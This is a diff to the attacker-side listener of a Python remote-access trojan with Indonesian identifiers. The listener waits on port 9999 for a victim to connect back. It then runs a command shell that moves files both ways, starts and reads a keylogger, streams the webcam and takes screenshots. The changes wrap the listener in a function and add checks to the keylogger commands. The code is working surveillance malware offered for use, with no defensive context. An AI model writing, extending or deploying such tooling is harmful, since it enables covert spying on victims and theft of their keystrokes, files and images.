@@ -11,18 +11,22 @@ import wave
 import pyaudio
 import sys
 
-try:
-    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    soc.bind(('0.0.0.0', 9999))
-    print('Waiting for connection')
-    soc.listen(1)
-    koneksi = soc.accept()
-    _target = koneksi[0]
-    ip = koneksi[1]
-    print(f'Connected to {str(ip)}')
-except KeyboardInterrupt:
-    print('exiting listener')
-    sys.exit()
+def main_con():
+    try:
+        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        soc.bind(('0.0.0.0', 9999))
+        print('Waiting for connection')
+        soc.listen(1)
+        koneksi = soc.accept()
+        _target = koneksi[0]
+        ip = koneksi[1]
+        print(f'Connected to {str(ip)}')
+        return _target
+    except KeyboardInterrupt:
+        print('exiting listener')
+        sys.exit()
+
+_target = main_con()
 
 def recv_status_priv(sec):
     try:
@@ -259,6 +263,7 @@ def data_diterima():
                  continue
 
 def shellc():
+    main_keylogger = False
     x = 0                      
     n = 0
     p = 0
@@ -279,15 +284,28 @@ def shellc():
             elif perintah[:6] == 'upload':
                 upload_file(perintah[7:])
             elif perintah == 'start_log':
+                main_keylogger = True
                 print('starting keylogger')
                 pass
             elif perintah == 'baca_log':
-                recv_keylog()
+                if main_keylogger:
+                    recv_keylog()
+                else:
+                    print("The main function didn't called, aborting")
+                    pass
             elif perintah == 'clear_log':
-                pass  
+                if main_keylogger:
+                    pass
+                else:
+                    print("The main function didn't called, aborting")
+                    pass
             elif perintah == 'stop_log':
-                print('stoping keylogger')
-                pass
+                if main_keylogger:
+                    print('stoping keylogger')
+                    pass
+                else:
+                    print("The main function didn't called, aborting")
+                    pass
             elif perintah == 'start_cam':
                 konversi_byte_stream()
             elif perintah ==  'screen_shot':
@@ -307,9 +325,9 @@ def shellc():
 
                         file transfer command:
                     ================================
-                    -download  >> download file
+                    -download <filename>  >> download file
 
-                    -upload    >> upload file
+                    -upload   <filename>  >> upload file
                     ================================
 
                         keylogging:
